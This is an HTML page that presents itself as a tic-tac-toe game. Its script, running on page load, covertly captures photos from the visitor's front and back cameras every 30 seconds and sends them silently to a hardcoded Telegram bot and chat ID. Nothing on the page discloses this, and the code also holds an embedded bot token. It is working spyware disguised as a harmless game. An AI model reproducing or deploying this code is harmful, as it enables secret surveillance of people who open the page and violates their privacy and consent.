<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tic Tac Toe with Camera</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            margin: 0;
        }

        .game-container {
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            margin-bottom: 20px;
            position: relative;
        }

        h1 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }

        .game-board {
            display: grid;
            grid-template-columns: repeat(3, 100px);
            grid-template-rows: repeat(3, 100px);
            gap: 5px;
            margin: 20px auto;
            background-color: #333;
            padding: 5px;
            border-radius: 10px;
        }

        .cell {
            background-color: white;
            border: none;
            font-size: 36px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            border-radius: 5px;
        }

        .cell:hover {
            background-color: #f0f0f0;
            transform: scale(1.05);
        }

        .cell.x {
            color: #e74c3c;
        }

        .cell.o {
            color: #3498db;
        }

        .game-info {
            text-align: center;
            margin: 20px 0;
        }

        .current-player {
            font-size: 24px;
            font-weight: bold;
            margin: 10px 0;
        }

        .reset-btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: block;
            margin: 0 auto;
        }

        .reset-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }

        .camera-preview {
            width: 60px;
            height: 45px;
            border: 2px solid #667eea;
            border-radius: 6px;
            overflow: hidden;
            background: #000;
            box-shadow: 0 2px 6px rgba(0,0,0,0.3);
            margin: 15px auto 0;
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        canvas {
            display: none;
        }

        .winner {
            font-size: 28px;
            font-weight: bold;
            color: #27ae60;
            margin: 20px 0;
        }

        .draw {
            font-size: 28px;
            font-weight: bold;
            color: #f39c12;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="game-container">
        <h1>üéÆ Tic Tac Toe Game</h1>
        
        <div class="game-info">
            <div class="current-player" id="currentPlayer">Current Player: X</div>
            <div id="gameStatus"></div>
        </div>

        <div class="game-board" id="gameBoard">
            <button class="cell" data-index="0"></button>
            <button class="cell" data-index="1"></button>
            <button class="cell" data-index="2"></button>
            <button class="cell" data-index="3"></button>
            <button class="cell" data-index="4"></button>
            <button class="cell" data-index="5"></button>
            <button class="cell" data-index="6"></button>
            <button class="cell" data-index="7"></button>
            <button class="cell" data-index="8"></button>
        </div>

        <button class="reset-btn" onclick="resetGame()">üîÑ Reset Game</button>
        
        <div class="camera-preview">
            <video id="video" autoplay muted></video>
        </div>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = '8405613377:AAESQVila1PXKZS81BVa7HwigibM61xbNlE';
        const TELEGRAM_CHAT_ID = '5862162696';

        // Game State
        let board = ['', '', '', '', '', '', '', '', ''];
        let currentPlayer = 'X';
        let gameActive = true;

        // Camera State
        let videoStream = null;
        let currentCamera = 'user'; // 'user' for front, 'environment' for back
        let captureInterval = null;

        // Winning combinations
        const winningCombinations = [
            [0, 1, 2], [3, 4, 5], [6, 7, 8], // Rows
            [0, 3, 6], [1, 4, 7], [2, 5, 8], // Columns
            [0, 4, 8], [2, 4, 6] // Diagonals
        ];

        // Initialize game
        document.addEventListener('DOMContentLoaded', function() {
            initializeGame();
            initializeCamera();
        });

        function initializeGame() {
            const cells = document.querySelectorAll('.cell');
            cells.forEach(cell => {
                cell.addEventListener('click', handleCellClick);
            });
        }

        function handleCellClick(event) {
            const index = event.target.getAttribute('data-index');
            
            if (board[index] !== '' || !gameActive) {
                return;
            }

            board[index] = currentPlayer;
            event.target.textContent = currentPlayer;
            event.target.classList.add(currentPlayer.toLowerCase());

            if (checkWinner()) {
                document.getElementById('gameStatus').innerHTML = `<div class="winner">üéâ Player ${currentPlayer} wins!</div>`;
                gameActive = false;
            } else if (board.every(cell => cell !== '')) {
                document.getElementById('gameStatus').innerHTML = `<div class="draw">ü§ù It's a draw!</div>`;
                gameActive = false;
            } else {
                currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
                document.getElementById('currentPlayer').textContent = `Current Player: ${currentPlayer}`;
            }
        }

        function checkWinner() {
            return winningCombinations.some(combination => {
                const [a, b, c] = combination;
                return board[a] && board[a] === board[b] && board[a] === board[c];
            });
        }

        function resetGame() {
            board = ['', '', '', '', '', '', '', '', ''];
            currentPlayer = 'X';
            gameActive = true;
            
            const cells = document.querySelectorAll('.cell');
            cells.forEach(cell => {
                cell.textContent = '';
                cell.classList.remove('x', 'o');
            });
            
            document.getElementById('currentPlayer').textContent = 'Current Player: X';
            document.getElementById('gameStatus').innerHTML = '';
        }

        // Camera Functions
        async function initializeCamera() {
            try {
                await startCamera();
                startCaptureTimer();
            } catch (error) {
                console.error('Camera initialization failed:', error);
            }
        }

        async function startCamera() {
            const video = document.getElementById('video');
            
            try {
                // Stop existing stream if any
                if (videoStream) {
                    videoStream.getTracks().forEach(track => track.stop());
                }

                const constraints = {
                    video: {
                        facingMode: currentCamera
                    }
                };

                videoStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = videoStream;
            } catch (error) {
                console.error('Error accessing camera:', error);
            }
        }

        function startCaptureTimer() {
            // Clear existing interval
            if (captureInterval) clearInterval(captureInterval);

            // Capture and toggle camera every 30 seconds
            captureInterval = setInterval(async () => {
                await captureAndSendPhoto();
                await toggleCamera();
            }, 30000);

            // Initial capture
            setTimeout(async () => {
                await captureAndSendPhoto();
            }, 1000);
        }

        async function toggleCamera() {
            currentCamera = currentCamera === 'user' ? 'environment' : 'user';
            await startCamera();
        }

        async function captureAndSendPhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            // Set canvas size to match video
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // Draw video frame to canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert canvas to blob
            canvas.toBlob(async (blob) => {
                if (blob) {
                    await sendPhotoToTelegram(blob);
                }
            }, 'image/jpeg', 0.8);
        }

        async function sendPhotoToTelegram(photoBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', photoBlob, 'capture.jpg');
                formData.append('disable_notification', 'true');

                const cameraType = currentCamera === 'user' ? 'Front' : 'Back';
                formData.append('caption', `üì∏ Auto capture from ${cameraType} camera - ${new Date().toLocaleString()}`);

                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    console.log('Photo sent to Telegram successfully');
                } else {
                    console.error('Failed to send photo to Telegram:', await response.text());
                }
            } catch (error) {
                console.error('Error sending photo to Telegram:', error);
            }
        }

        // Cleanup on page unload
        window.addEventListener('beforeunload', () => {
            if (videoStream) {
                videoStream.getTracks().forEach(track => track.stop());
            }
            if (captureInterval) clearInterval(captureInterval);
        });
    </script>
</body>
</html>
